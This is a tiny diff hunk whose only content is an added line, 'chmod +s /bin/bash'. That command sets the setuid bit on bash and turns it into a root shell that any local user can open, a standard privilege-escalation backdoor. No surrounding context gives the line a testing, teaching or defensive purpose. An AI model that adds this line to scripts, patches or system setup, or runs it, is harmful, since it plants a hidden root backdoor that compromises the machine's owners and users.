@@ -1,0 +1,1 @@
+chmod +s /bin/bash
